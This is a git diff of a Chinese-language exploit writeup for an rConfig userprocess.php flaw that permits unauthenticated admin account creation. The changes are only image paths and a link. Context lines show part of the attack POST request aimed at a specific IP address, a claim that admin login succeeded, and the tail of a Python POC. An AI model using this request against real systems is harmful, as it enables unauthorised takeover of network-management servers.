@@ -272,9 +272,9 @@ $process = new Process;
 
 出现漏洞的原因是对权限设定错误，任何人都可以通过访问这个文件创建管理员用户
 
-发送如下请求包创建管理员用户 testtest，密码为 testtest[@123 ]() 
+发送如下请求包创建管理员用户 testtest，密码为 testtest[@123](<rConfig userprocess.php 任意用户创建漏洞.md>)
 
-```plain
+```
 POST /lib/crud/userprocess.php HTTP/1.1
 Host: 194.149.41.11
 User-Agent: python-requests/2.25.1
@@ -319,11 +319,11 @@ Content-Disposition: form-data; name="editid"
 --b1467349fcce4aa0ae8d44439f4e06bc--
 ```
 
-![](images/202202162241827.png)
+![](../.gitbook/assets/202202162241827.png)
 
 成功创建用户 testtest，以管理员身份登录后台
 
-![](images/202202162242368.png)
+![](../.gitbook/assets/202202162242368.png)
 
 ## 漏洞POC
 
@@ -390,4 +390,4 @@ if __name__ == '__main__':
     POC_1(target_url)
 ```
 
-![](images/202202162242409.png)
+![](../.gitbook/assets/202202162242409.png)
